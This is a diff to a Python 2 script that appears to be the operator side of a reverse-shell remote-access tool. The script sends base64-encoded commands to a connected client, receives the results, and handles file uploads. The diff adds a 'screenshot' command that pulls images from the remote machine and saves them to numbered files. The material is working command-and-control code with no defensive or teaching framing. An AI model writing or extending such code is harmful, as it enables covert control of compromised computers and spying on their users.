@@ -4,6 +4,10 @@ import json # use this inorder to dump the data as bytes as it can
 import base64
 
 
+
+count = 1
+
+
 # we gonna send send and receive data as wew want ==
 def reliable_send(data):
 	json_data = json.dumps(data)
@@ -27,6 +31,7 @@ def reliable_rcv():
 
 
 def shell():
+	global count
 	while True:
 		# command to send to client (input)
 		command = raw_input("* Shell#~%s: " % str(ip))
@@ -48,6 +53,15 @@ def shell():
 			except:
 				failed = "failed to upload"
 				reliable_send(base64.b64encode(failed))
+		elif command[:10] == "screenshot":
+			with open("screenshot%d" % count, "wb") as screen:
+				image = reliable_rcv()
+				image_decoded = base64.b64decode(image)
+				if image_decoded[:4] == "[!!]":
+					print(image_decoded)
+				else:
+					screen.write(image_decoded)
+					count+=1
 		else:
 			result = reliable_rcv() #  receive bytes
 			print(result)
